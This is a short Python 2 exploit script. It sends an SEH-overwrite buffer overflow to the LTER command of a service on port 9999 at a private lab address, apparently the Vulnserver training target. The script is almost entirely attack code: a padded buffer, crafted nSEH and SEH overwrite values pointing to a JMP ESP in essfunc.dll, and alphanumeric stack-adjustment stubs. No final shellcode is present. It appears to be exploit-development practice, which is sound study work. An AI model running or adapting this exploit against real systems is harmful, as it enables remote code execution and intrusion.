#!/usr/bin/python

import socket
import os
import sys

host = "192.168.100.118"
port = 9999

nSeh = '\x54\x58\x74\x04' # push esp; pop eax; \x74 (JZ)
Seh  = '\x2b\x17\x50\x62' # 0x6250172B - JMP ESP - essfunc.dll
espAdj  = "\x54\x58\x66\x05\x30\x10\x66\x05\x7F\x01\x50\x5C\x66\x2D\x14\x7F\x50"
espAdj2 = "\x54\x58\x2C\x20\x50\x5C"

buffer = 'A' * 3399
buffer += espAdj2
buffer += 'A' * (3494 - len(buffer))
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += 'A' * (5000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()

